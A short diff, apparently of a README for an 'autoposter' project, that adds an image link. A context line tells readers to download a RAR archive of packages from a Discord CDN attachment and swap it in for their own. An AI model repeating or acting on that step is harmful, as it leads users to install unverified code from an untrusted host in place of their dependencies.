@@ -3,4 +3,5 @@
 
 download packages and replace them https://cdn.discordapp.com/attachments/807651439346319413/972196654163845140/packages.rar
 
+![alt text](https://github.com/baris1337/autoposter/image.jpg?raw=true)
 
